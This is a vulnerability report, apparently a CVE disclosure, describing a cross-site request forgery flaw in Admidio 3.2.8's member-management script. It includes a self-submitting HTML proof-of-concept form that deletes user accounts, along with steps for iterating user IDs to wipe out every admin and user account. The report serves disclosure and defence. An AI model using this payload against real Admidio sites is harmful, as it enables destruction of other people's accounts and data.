[Suggested description]
Admidio 3.2.8 has CSRF in
adm_program/modules/members/members_function.php with
  an impact of deleting arbitrary user accounts.

  ------------------------------------------

  [Additional Information]
  Using this crafted html form we are able to delete any user with
admin/user privilege.

  <html>
    <body onload="javascript:document.forms[0].submit()">
      <form
action="http://localhost/newadmidio/admidio-3.2.8/adm_program/modules/members/members_function.php">
        <input type="hidden" name="usr&#95;id" value='9' />
        <input type="hidden" name="mode" value="3" />
        </form>
    </body>
  </html>

[Affected Component]
  http://localhost/newadmidio/admidio-3.2.8/adm_program/modules/members/members_function.php

  ------------------------------------------

  [Attack Type]
  Remote

  ------------------------------------------

  [Impact Escalation of Privileges]
  true

  ------------------------------------------

  [Attack Vectors]
  Steps:
  1.) If an user with admin privilege opens a crafted
  html/JPEG(Image),then both the admin and users with user privilege
  which are mentioned by the user id (as like shown below) in the
  crafted request are deleted.

   <input type="hidden" name="usr&#95;id" value='3' />

  2.) In admidio by default the userid starts from '0',
  '1' for system '2' for users, so an attacker
  can start from '2' upto 'n' users.

  3.)For deleting the user permanently we select 'mode=3'(as like shown
  below),then all admin/low privileged users are deleted.

   <input type="hidden" name="mode" value="3" />
